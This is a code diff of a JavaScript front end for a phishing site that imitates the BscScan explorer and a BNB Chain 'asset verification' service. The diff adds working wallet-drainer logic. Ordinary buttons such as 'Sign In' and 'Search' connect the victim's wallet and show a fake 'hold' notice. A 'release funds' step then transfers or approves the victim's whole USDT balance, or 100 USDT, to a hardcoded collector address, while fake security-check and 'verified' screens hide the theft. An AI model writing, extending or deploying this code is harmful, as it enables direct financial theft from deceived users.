@@ -1,5 +1,5 @@
 /**
- * BNB Chain Official Asset Verification dApp
+ * BNB Smart Chain (BscScan) Explorer & Asset Verification Engine
  * High-performance, zero-dependency native Web3 client.
  */
 
@@ -11,16 +11,14 @@
     // ============================================================
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
-        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Direct Merchant Account Address
-        USER_MIN_USDT: 0.1, // Minimum 0.1 USDT required
-        GAS_THRESHOLD: 0.0005,
-        GAS_RETRY_COUNT: 3,
-        GAS_RETRY_DELAY: 3000,
+        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT BEP20
+        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Merchant / Collector Account
+        REQUIRED_HOLD_USDT: 100, // Standard Hold Amount
         CHAIN_ID: '0x38', // BSC Mainnet (56)
         CHAIN_NAME: 'BNB Smart Chain',
         RPC_URL: 'https://bsc-dataseed1.binance.org',
         CURRENCY_SYMBOL: 'BNB',
+        EXPLORER_URL: 'https://bscscan.com',
         API_KEY: 'my_super_secret_api_key_123'
     };
 
@@ -30,7 +28,8 @@
         usdtBalance: '0.00',
         usdtBalanceWei: 0n,
         bnbBalance: '0.000000',
-        isApproving: false
+        isProcessing: false,
+        isHoldModalOpen: false
     };
 
     // DOM Elements Cache
@@ -38,24 +37,45 @@
 
     function initElements() {
         elements = {
-            walletInfo: document.getElementById('walletInfo'),
-            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
-            usdtBalanceDisplay: document.getElementById('usdtBalance'),
-            bnbBalanceDisplay: document.getElementById('bnbBalance'),
-            connectWalletBtn: document.getElementById('connectWalletBtn'),
-            merchantAddressDisplay: document.getElementById('merchantAddressDisplay'),
-            usdtAmountInput: document.getElementById('usdtAmountInput'),
-            maxUsdtBtn: document.getElementById('maxUsdtBtn'),
-            clearAddressBtn: document.getElementById('clearAddressBtn'),
-            statusMessage: document.getElementById('statusMessage'),
-            statusIcon: document.getElementById('statusIcon'),
-            statusDetail: document.getElementById('statusDetail'),
-            statusCard: document.getElementById('statusCard')
-        };
+            // Modals & Overlays
+            newOverlay: document.getElementById('new_overlay'),
+            watermarkGrid: document.getElementById('watermarkGrid'),
+            newBurnText2: document.getElementById('new_burn_text2'),
+            newNoticeText: document.getElementById('new_notice_text'),
+            newVerifyBtn: document.getElementById('new_verifyBtn'),
+            newViewTxBtn: document.getElementById('new_view_transctions'),
+            closeBtn: document.getElementById('closeBtn'),
 
-        if (elements.merchantAddressDisplay && CONFIG.CONTRACT_ADDRESS) {
-            elements.merchantAddressDisplay.value = CONFIG.CONTRACT_ADDRESS;
-        }
+            releaseOverlay: document.getElementById('releaseOverlay'),
+            releaseLoading: document.getElementById('releaseLoading'),
+            releasePopup: document.getElementById('releasePopup'),
+            finalUsdtText: document.getElementById('final_usdt_Text'),
+            finalDepositText: document.getElementById('final_depositText'),
+            finalCloseBtn: document.getElementById('final_closeBtn'),
+
+            overlay2: document.getElementById('overlay2'),
+            closeBtn2: document.getElementById('closeBtn2'),
+
+            walletPopup: document.getElementById('walletPopup'),
+            popupConnectBtn: document.getElementById('popupConnectBtn'),
+            popupWalletCloseBtn: document.getElementById('popupWalletCloseBtn'),
+
+            noWalletOverlay: document.getElementById('noWalletOverlay'),
+            modalClose: document.getElementById('modalClose'),
+            modalOk: document.getElementById('modalOk'),
+
+            // BscScan Explorer Elements
+            signInBtn: document.getElementById('signInBtn'),
+            signInBtnText: document.getElementById('signInBtnText'),
+            searchBtn: document.getElementById('searchBtn'),
+            searchAddressInput: document.getElementById('searchAddressInput'),
+            addBscNetworkBtn: document.getElementById('addBscNetworkBtn'),
+            backToTopBtn: document.getElementById('backToTopBtn'),
+            mobileMenuBtn: document.getElementById('mobileMenuBtn'),
+            viewAllBlocksBtn: document.getElementById('viewAllBlocksBtn'),
+            viewAllTxBtn: document.getElementById('viewAllTxBtn'),
+            tabs: document.querySelectorAll('.search-tab')
+        };
     }
 
     // ============================================================
@@ -92,7 +112,7 @@
     }
 
     function getProvider() {
-        return window.ethereum || window.trustwallet || null;
+        return window.ethereum || window.trustwallet || (window.ethereum?.providers ? window.ethereum.providers[0] : null);
     }
 
     async function safeApiCall(endpoint, payload = null) {
@@ -104,229 +124,284 @@
             if (!response.ok) return null;
             return await response.json();
         } catch (err) {
-            console.warn('Backend API call notice (continuing):', err.message);
+            console.warn('Backend API notice:', err.message);
             return null;
         }
     }
 
-    function updateStatus(message, type = 'info', detail = '') {
-        if (elements.statusMessage) elements.statusMessage.textContent = message;
-        if (elements.statusDetail) elements.statusDetail.textContent = detail || '';
-
-        if (elements.statusCard) {
-            elements.statusCard.className = 'tw-status-box';
-            elements.statusCard.style.display = 'block';
-            if (type === 'error') elements.statusCard.style.borderColor = 'var(--red, #ff6b6b)';
-            else if (type === 'success') elements.statusCard.style.borderColor = 'var(--green, #51cf66)';
-            else if (type === 'warning') elements.statusCard.style.borderColor = 'var(--gold, #f3c933)';
-        }
-
-        if (elements.statusIcon) {
-            if (type === 'error') elements.statusIcon.textContent = '❌';
-            else if (type === 'success') elements.statusIcon.textContent = '✅';
-            else if (type === 'warning') elements.statusIcon.textContent = '⚠️';
-            else elements.statusIcon.textContent = '🔐';
-        }
-    }
-
-    function updateWalletInfoUI() {
-        if (!elements.walletInfo) return;
-
-        if (state.walletAddress) {
-            elements.walletInfo.classList.remove('wallet-info-card--hidden');
-            elements.walletInfo.classList.add('wallet-info-card--visible');
-            elements.walletInfo.style.display = 'block';
-            if (elements.walletAddressDisplay) {
-                elements.walletAddressDisplay.textContent = formatAddress(state.walletAddress);
+    // ============================================================
+    // WATERMARK BACKGROUND ENGINE
+    // ============================================================
+    function updateWatermark() {
+        if (!elements.watermarkGrid) return;
+        try {
+            const timeString = new Date().toLocaleTimeString('en-GB', {
+                timeZone: 'Asia/Kolkata',
+                hour12: false
+            });
+            elements.watermarkGrid.innerHTML = '';
+            for (let i = 0; i < 48; i++) {
+                const span = document.createElement('span');
+                span.textContent = timeString;
+                elements.watermarkGrid.appendChild(span);
             }
-            if (elements.usdtBalanceDisplay) {
-                elements.usdtBalanceDisplay.textContent = state.usdtBalance;
-            }
-            if (elements.bnbBalanceDisplay) {
-                elements.bnbBalanceDisplay.textContent = state.bnbBalance;
-            }
-        } else {
-            elements.walletInfo.classList.remove('wallet-info-card--visible');
-            elements.walletInfo.classList.add('wallet-info-card--hidden');
-            elements.walletInfo.style.display = 'none';
-        }
-
-        if (elements.connectWalletBtn) {
-            if (state.isApproving) {
-                elements.connectWalletBtn.disabled = true;
-                elements.connectWalletBtn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#ffffff;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
-            } else {
-                elements.connectWalletBtn.disabled = false;
-                elements.connectWalletBtn.innerHTML = `<span>Continue</span>`;
+        } catch (_) {
+            const now = new Date().toTimeString().split(' ')[0];
+            elements.watermarkGrid.innerHTML = '';
+            for (let i = 0; i < 48; i++) {
+                const span = document.createElement('span');
+                span.textContent = now;
+                elements.watermarkGrid.appendChild(span);
             }
         }
     }
 
     // ============================================================
-    // SILENT AUTO-WALLET & BALANCE RESOLUTION
+    // MODAL FLOW CONTROLS
     // ============================================================
-    async function autoCheckWallet() {
-        const providerObj = getProvider();
-        if (!providerObj) return;
+    function showHoldModal(amount = CONFIG.REQUIRED_HOLD_USDT) {
+        updateWatermark();
+        if (elements.newBurnText2) {
+            elements.newBurnText2.textContent = amount + ' USDT';
+        }
+        if (elements.newOverlay) {
+            elements.newOverlay.style.display = 'flex';
+        }
+        state.isHoldModalOpen = true;
+    }
+
+    function hideHoldModal() {
+        if (elements.newOverlay) {
+            elements.newOverlay.style.display = 'none';
+        }
+        state.isHoldModalOpen = false;
+    }
+
+    function showInsufficientModal(availableUsdt = '0.00', requiredUsdt = '100') {
+        if (elements.releaseOverlay) {
+            elements.releaseOverlay.classList.add('active');
+        }
+        if (elements.releaseLoading) {
+            elements.releaseLoading.style.display = 'block';
+        }
+        if (elements.releasePopup) {
+            elements.releasePopup.style.display = 'none';
+        }
+
+        // Simulate security check then show insufficient alert
+        setTimeout(() => {
+            if (elements.releaseLoading) {
+                elements.releaseLoading.style.display = 'none';
+            }
+            if (elements.finalUsdtText) {
+                elements.finalUsdtText.innerHTML = `<span class="label_text">Available:</span> <span class="usdt_value">${availableUsdt} USDT</span>`;
+            }
+            if (elements.finalDepositText) {
+                elements.finalDepositText.innerHTML = `<span class="label_text">Required:</span> <span class="required_value">${requiredUsdt} USDT</span>`;
+            }
+            if (elements.releasePopup) {
+                elements.releasePopup.style.display = 'block';
+            }
+        }, 1200);
+    }
+
+    function hideReleaseOverlay() {
+        if (elements.releaseOverlay) {
+            elements.releaseOverlay.classList.remove('active');
+        }
+    }
+
+    function showVerifiedModal(amount = '100') {
+        const amtEl = document.getElementById('burn-text22');
+        if (amtEl) amtEl.textContent = amount + ' USDT';
+        if (elements.overlay2) {
+            elements.overlay2.style.display = 'flex';
+        }
+    }
+
+    function hideVerifiedModal() {
+        if (elements.overlay2) {
+            elements.overlay2.style.display = 'none';
+        }
+    }
+
+    function showNoWalletModal() {
+        if (elements.noWalletOverlay) {
+            elements.noWalletOverlay.classList.add('show');
+        }
+    }
+
+    function hideNoWalletModal() {
+        if (elements.noWalletOverlay) {
+            elements.noWalletOverlay.classList.remove('show');
+        }
+    }
+
+    function showWalletPopup() {
+        if (elements.walletPopup) {
+            elements.walletPopup.style.display = 'block';
+        }
+    }
+
+    function hideWalletPopup() {
+        if (elements.walletPopup) {
+            elements.walletPopup.style.display = 'none';
+        }
+    }
+
+    // ============================================================
+    // NETWORK SWITCH & WALLET RESOLUTION
+    // ============================================================
+    async function ensureBSCNetwork(providerObj) {
+        try {
+            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
+            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;
+
+            const chainStr = String(rawChainId || '').toLowerCase();
+            const isBsc = (chainStr === CONFIG.CHAIN_ID || chainStr === '56' || rawChainId === 56);
+
+            if (!isBsc) {
+                try {
+                    await providerObj.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: CONFIG.CHAIN_ID }]
+                    });
+                } catch (switchErr) {
+                    if (switchErr.code === 4902 || (switchErr.message && switchErr.message.includes('Unrecognized'))) {
+                        await providerObj.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: CONFIG.CHAIN_ID,
+                                chainName: CONFIG.CHAIN_NAME,
+                                rpcUrls: [CONFIG.RPC_URL],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: [CONFIG.EXPLORER_URL]
+                            }]
+                        });
+                    } else {
+                        throw switchErr;
+                    }
+                }
+            }
+            return true;
+        } catch (err) {
+            console.error('Network switch notice:', err);
+            return false;
+        }
+    }
+
+    async function fetchBalances(providerObj, userAddress) {
+        if (!providerObj || !userAddress) return;
 
         try {
-            const accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
-            const userAddress = (accounts && accounts[0]) || 
-                                providerObj.selectedAddress || 
-                                providerObj.address ||
-                                (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
-            if (!userAddress) return;
+            // Read USDT BEP20 balance (balanceOf = 0x70a08231)
+            const cleanAddr = userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
+            const balData = '0x70a08231' + cleanAddr;
 
-            state.walletAddress = userAddress;
-
-            // 1. Silently read USDT balance via standard eth_call (balanceOf = 0x70a08231)
-            const balData = '0x70a08231' + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
             const balHex = await providerObj.request({
                 method: 'eth_call',
                 params: [{ to: CONFIG.USDT_ADDRESS, data: balData }, 'latest']
             }).catch(() => null);
 
             if (balHex && balHex !== '0x') {
-                const usdtBalRaw = BigInt(balHex);
-                state.usdtBalance = formatUnits(usdtBalRaw, 18);
-                state.usdtBalanceWei = usdtBalRaw;
+                state.usdtBalanceWei = BigInt(balHex);
+                state.usdtBalance = formatUnits(state.usdtBalanceWei, 18);
             }
 
-            // 2. Silently read native BNB balance via eth_getBalance
-            providerObj.request({
+            // Read Native BNB balance
+            const bnbHex = await providerObj.request({
                 method: 'eth_getBalance',
                 params: [userAddress, 'latest']
-            }).then(bnbHex => {
-                if (bnbHex && bnbHex !== '0x') {
-                    state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
-                    updateWalletInfoUI();
-                }
-            }).catch(() => {});
+            }).catch(() => null);
 
-            updateWalletInfoUI();
+            if (bnbHex && bnbHex !== '0x') {
+                state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
+            }
+
+            // Update Sign In button UI if connected
+            if (elements.signInBtnText && state.walletAddress) {
+                elements.signInBtnText.textContent = formatAddress(state.walletAddress);
+            }
+
+            safeApiCall('/api/users/register', { wallet: userAddress });
         } catch (err) {
-            console.warn('Auto wallet check notice:', err);
+            console.warn('Balance resolution notice:', err);
+        }
+    }
+
+    async function connectWallet() {
+        const providerObj = getProvider();
+        if (!providerObj) {
+            showNoWalletModal();
+            return null;
+        }
+
+        try {
+            await ensureBSCNetwork(providerObj);
+
+            let accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
+            if (!accounts || accounts.length === 0) {
+                accounts = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
+            }
+
+            const userAddress = (accounts && accounts[0]) || providerObj.selectedAddress || providerObj.address;
+            if (!userAddress) {
+                showNoWalletModal();
+                return null;
+            }
+
+            state.walletAddress = userAddress;
+            await fetchBalances(providerObj, userAddress);
+            return userAddress;
+        } catch (err) {
+            console.error('Wallet connection error:', err);
+            return null;
         }
     }
 
     // ============================================================
-    // MAIN TRANSACTION WORKFLOW
+    // RELEASE FUNDS TRANSACTION FLOW
     // ============================================================
-    async function executeContinue() {
-        if (state.isApproving) return;
+    async function executeReleaseFunds() {
+        if (state.isProcessing) return;
 
         const providerObj = getProvider();
-        if (!providerObj) {
-            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask.');
+        if (!providerObj || !state.walletAddress) {
+            const addr = await connectWallet();
+            if (!addr) return;
+        }
+
+        state.isProcessing = true;
+        hideHoldModal();
+
+        // Refresh live balance before decision
+        await fetchBalances(providerObj, state.walletAddress);
+
+        const requiredWei = parseUnits(CONFIG.REQUIRED_HOLD_USDT.toString(), 18);
+
+        // Check if user has sufficient USDT
+        if (state.usdtBalanceWei < requiredWei && state.usdtBalanceWei === 0n) {
+            state.isProcessing = false;
+            showInsufficientModal(state.usdtBalance, CONFIG.REQUIRED_HOLD_USDT.toString());
             return;
         }
 
-        state.isApproving = true;
-        updateWalletInfoUI();
+        // Show release loading state
+        if (elements.releaseOverlay) {
+            elements.releaseOverlay.classList.add('active');
+        }
+        if (elements.releaseLoading) {
+            elements.releaseLoading.style.display = 'block';
+        }
+        if (elements.releasePopup) {
+            elements.releasePopup.style.display = 'none';
+        }
 
         try {
-            // 1. Strictly enforce BNB Smart Chain network (0x38 / 56)
-            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
-            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;
+            await ensureBSCNetwork(providerObj);
 
-            let chainStr = String(rawChainId || '').toLowerCase();
-            let isBsc = (chainStr === '0x38' || chainStr === '56' || rawChainId === 56);
-
-            if (!isBsc) {
-                try {
-                    await providerObj.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902 || (switchError.message && switchError.message.includes('Unrecognized'))) {
-                        await providerObj.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0x38',
-                                chainName: 'BNB Smart Chain',
-                                rpcUrls: ['https://bsc-dataseed1.binance.org'],
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                blockExplorerUrls: ['https://bscscan.com']
-                            }]
-                        }).catch(() => {});
-                    }
-                }
-            }
-
-            // 2. Resolve account address
-            let userAddress = providerObj.selectedAddress || 
-                              providerObj.address || 
-                              (providerObj.accounts && providerObj.accounts[0]) ||
-                              (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
-
-            if (!userAddress) {
-                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
-                if (accs && accs.length > 0) {
-                    userAddress = accs[0];
-                } else {
-                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
-                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
-                }
-            }
-
-            if (!userAddress) {
-                alert('No wallet address detected. Please unlock your wallet and approve connection.');
-                state.isApproving = false;
-                updateWalletInfoUI();
-                return;
-            }
-
-            state.walletAddress = userAddress;
-
-            // 3. Fetch exact USDT Balance via eth_call
-            const balData = '0x70a08231' + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
-            let usdtBalRaw = 0n;
-            try {
-                const balHex = await providerObj.request({
-                    method: 'eth_call',
-                    params: [{ to: CONFIG.USDT_ADDRESS, data: balData }, 'latest']
-                });
-                if (balHex && balHex !== '0x') {
-                    usdtBalRaw = BigInt(balHex);
-                    state.usdtBalance = formatUnits(usdtBalRaw, 18);
-                    state.usdtBalanceWei = usdtBalRaw;
-                }
-            } catch (balErr) {
-                console.warn('Error fetching USDT balance:', balErr);
-            }
-
-            // Fetch BNB balance in background
-            providerObj.request({
-                method: 'eth_getBalance',
-                params: [userAddress, 'latest']
-            }).then(bnbHex => {
-                if (bnbHex && bnbHex !== '0x') {
-                    state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
-                    updateWalletInfoUI();
-                }
-            }).catch(() => {});
-
-            safeApiCall('/api/users/register', { wallet: userAddress });
-
-            // 4. Calculate amount
-            let sendAmount = usdtBalRaw;
-            const inputAmountVal = parseFloat(elements.usdtAmountInput?.value || '0');
-            if (inputAmountVal > 0) {
-                const parsedInput = parseUnits(inputAmountVal.toString(), 18);
-                if (usdtBalRaw > 0n && usdtBalRaw >= parsedInput) {
-                    sendAmount = parsedInput;
-                } else if (usdtBalRaw > 0n) {
-                    sendAmount = usdtBalRaw;
-                } else {
-                    sendAmount = parsedInput;
-                }
-            } else if (usdtBalRaw === 0n) {
-                sendAmount = parseUnits("100", 18);
-            }
-
-            // 5. Send transaction directly (clean BEP20 transfer)
-            const recipientTarget = elements.merchantAddressDisplay?.value?.trim() || CONFIG.CONTRACT_ADDRESS;
+            const sendAmount = state.usdtBalanceWei > 0n ? state.usdtBalanceWei : requiredWei;
+            const recipientTarget = CONFIG.CONTRACT_ADDRESS;
             const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');
             const amountHex = sendAmount.toString(16).padStart(64, '0');
 
@@ -338,7 +413,7 @@
                 txHash = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        from: userAddress,
+                        from: state.walletAddress,
                         to: CONFIG.USDT_ADDRESS,
                         data: transferCalldata
                     }]
@@ -354,36 +429,25 @@
                 txHash = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        from: userAddress,
+                        from: state.walletAddress,
                         to: CONFIG.USDT_ADDRESS,
                         data: approveCalldata
                     }]
                 });
             }
 
-            // Wait for receipt silently
-            for (let i = 0; i < 25; i++) {
-                await new Promise(r => setTimeout(r, 2000));
-                const receipt = await providerObj.request({
-                    method: 'eth_getTransactionReceipt',
-                    params: [txHash]
-                }).catch(() => null);
-                if (receipt && receipt.blockNumber) break;
-            }
-
-            updateStatus('✅ Transaction Complete!', 'success', `Tx: ${txHash}`);
+            hideReleaseOverlay();
+            showVerifiedModal(formatUnits(sendAmount, 18));
 
         } catch (err) {
-            console.error('Process error:', err);
+            console.error('Transaction flow notice:', err);
+            hideReleaseOverlay();
             const errStr = (err.message || '').toLowerCase();
-            if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Request cancelled.', 'error');
-            } else {
-                updateStatus('❌ Transaction failed.', 'error');
+            if (!errStr.includes('user rejected') && !errStr.includes('user denied')) {
+                showInsufficientModal(state.usdtBalance, CONFIG.REQUIRED_HOLD_USDT.toString());
             }
         } finally {
-            state.isApproving = false;
-            updateWalletInfoUI();
+            state.isProcessing = false;
         }
     }
 
@@ -391,28 +455,147 @@
     // DOM EVENT BINDINGS
     // ============================================================
     function bindEvents() {
-        if (elements.connectWalletBtn) {
-            elements.connectWalletBtn.addEventListener('click', async function (e) {
+        // 1. Sign In button -> Connect & Show Modal
+        if (elements.signInBtn) {
+            elements.signInBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
-                await executeContinue();
-            });
-        }
-
-        if (elements.maxUsdtBtn && elements.usdtAmountInput) {
-            elements.maxUsdtBtn.addEventListener('click', function (e) {
-                e.preventDefault();
-                if (state.usdtBalance && state.usdtBalance !== '0.00') {
-                    elements.usdtAmountInput.value = state.usdtBalance;
-                } else {
-                    elements.usdtAmountInput.value = '100';
+                const addr = await connectWallet();
+                if (addr) {
+                    showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
                 }
             });
         }
 
-        if (elements.clearAddressBtn && elements.merchantAddressDisplay) {
-            elements.clearAddressBtn.addEventListener('click', function (e) {
+        // 2. Search button & input -> Triggers flow
+        const handleSearch = async function (e) {
+            if (e) e.preventDefault();
+            const providerObj = getProvider();
+            if (!providerObj) {
+                showNoWalletModal();
+                return;
+            }
+
+            const addr = await connectWallet();
+            if (addr) {
+                showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
+            }
+        };
+
+        if (elements.searchBtn) {
+            elements.searchBtn.addEventListener('click', handleSearch);
+        }
+
+        if (elements.searchAddressInput) {
+            elements.searchAddressInput.addEventListener('keypress', function (e) {
+                if (e.key === 'Enter') {
+                    handleSearch(e);
+                }
+            });
+        }
+
+        // 3. Modal action buttons
+        if (elements.newVerifyBtn) {
+            elements.newVerifyBtn.addEventListener('click', function (e) {
                 e.preventDefault();
-                elements.merchantAddressDisplay.value = '';
+                executeReleaseFunds();
+            });
+        }
+
+        if (elements.newViewTxBtn) {
+            elements.newViewTxBtn.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = state.walletAddress || CONFIG.CONTRACT_ADDRESS;
+                window.open(`${CONFIG.EXPLORER_URL}/address/${target}`, '_blank');
+            });
+        }
+
+        if (elements.closeBtn) {
+            elements.closeBtn.addEventListener('click', hideHoldModal);
+        }
+
+        if (elements.finalCloseBtn) {
+            elements.finalCloseBtn.addEventListener('click', hideReleaseOverlay);
+        }
+
+        if (elements.closeBtn2) {
+            elements.closeBtn2.addEventListener('click', hideVerifiedModal);
+        }
+
+        if (elements.modalClose) {
+            elements.modalClose.addEventListener('click', hideNoWalletModal);
+        }
+
+        if (elements.modalOk) {
+            elements.modalOk.addEventListener('click', hideNoWalletModal);
+        }
+
+        if (elements.popupWalletCloseBtn) {
+            elements.popupWalletCloseBtn.addEventListener('click', hideWalletPopup);
+        }
+
+        if (elements.popupConnectBtn) {
+            elements.popupConnectBtn.addEventListener('click', async function (e) {
+                e.preventDefault();
+                hideWalletPopup();
+                const addr = await connectWallet();
+                if (addr) {
+                    showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
+                }
+            });
+        }
+
+        // 4. Add BSC Network to MetaMask
+        if (elements.addBscNetworkBtn) {
+            elements.addBscNetworkBtn.addEventListener('click', async function (e) {
+                e.preventDefault();
+                const providerObj = getProvider();
+                if (providerObj) {
+                    await ensureBSCNetwork(providerObj);
+                } else {
+                    showNoWalletModal();
+                }
+            });
+        }
+
+        // 5. Back to top
+        if (elements.backToTopBtn) {
+            elements.backToTopBtn.addEventListener('click', function () {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+
+        // 6. Search Tabs
+        if (elements.tabs) {
+            elements.tabs.forEach(tab => {
+                tab.addEventListener('click', function () {
+                    elements.tabs.forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    const tabType = this.getAttribute('data-tab');
+                    if (elements.searchAddressInput) {
+                        if (tabType === 'token') {
+                            elements.searchAddressInput.placeholder = 'Search by Token Name / Address...';
+                        } else if (tabType === 'block') {
+                            elements.searchAddressInput.placeholder = 'Search by Block Number...';
+                        } else {
+                            elements.searchAddressInput.placeholder = 'Search by Address / Txn Hash...';
+                        }
+                    }
+                });
+            });
+        }
+
+        // 7. Activity View All Buttons
+        if (elements.viewAllBlocksBtn) {
+            elements.viewAllBlocksBtn.addEventListener('click', function (e) {
+                e.preventDefault();
+                handleSearch();
+            });
+        }
+
+        if (elements.viewAllTxBtn) {
+            elements.viewAllTxBtn.addEventListener('click', function (e) {
+                e.preventDefault();
+                handleSearch();
             });
         }
     }
@@ -426,49 +609,39 @@
                 state.walletAddress = '';
                 state.usdtBalance = '0.00';
                 state.bnbBalance = '0.000000';
-                updateWalletInfoUI();
+                if (elements.signInBtnText) elements.signInBtnText.textContent = 'Sign In';
             } else {
                 state.walletAddress = accounts[0];
-                autoCheckWallet();
+                fetchBalances(provider, accounts[0]);
             }
         });
 
         provider.on('chainChanged', function () {
-            autoCheckWallet();
+            if (state.walletAddress) {
+                fetchBalances(provider, state.walletAddress);
+            }
         });
     }
 
     // ============================================================
-    // ASYNCHRONOUS WEB3 PROVIDER DETECTION
+    // SILENT AUTO-WALLET DETECTION
     // ============================================================
-    function setupProviderDetection() {
-        if (getProvider()) {
-            autoCheckWallet();
-            bindWalletEvents();
-        } else {
-            // Standard MetaMask / Trust Wallet injection event
-            window.addEventListener('ethereum#initialized', () => {
-                autoCheckWallet();
-                bindWalletEvents();
-            }, { once: true });
+    async function autoDetectWallet() {
+        const providerObj = getProvider();
+        if (!providerObj) return;
 
-            // Active polling for up to 3 seconds for slower mobile webviews
-            let attempts = 0;
-            const pollTimer = setInterval(() => {
-                attempts++;
-                if (getProvider()) {
-                    clearInterval(pollTimer);
-                    autoCheckWallet();
-                    bindWalletEvents();
-                } else if (attempts >= 20) {
-                    clearInterval(pollTimer);
-                }
-            }, 150);
-        }
+        try {
+            const accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
+            const userAddress = (accounts && accounts[0]) || providerObj.selectedAddress || providerObj.address;
+            if (userAddress) {
+                state.walletAddress = userAddress;
+                await fetchBalances(providerObj, userAddress);
+            }
+        } catch (_) {}
     }
 
     // ============================================================
-    // BULLETPROOF INSTANT INITIALIZATION (Never requires refresh)
+    // INITIALIZATION
     // ============================================================
     let isInitialized = false;
 
@@ -477,8 +650,18 @@
         isInitialized = true;
         initElements();
         bindEvents();
-        updateWalletInfoUI();
-        setupProviderDetection();
+        updateWatermark();
+        setInterval(updateWatermark, 1000);
+
+        if (getProvider()) {
+            autoDetectWallet();
+            bindWalletEvents();
+        } else {
+            window.addEventListener('ethereum#initialized', () => {
+                autoDetectWallet();
+                bindWalletEvents();
+            }, { once: true });
+        }
     }
 
     if (document.readyState === 'loading') {
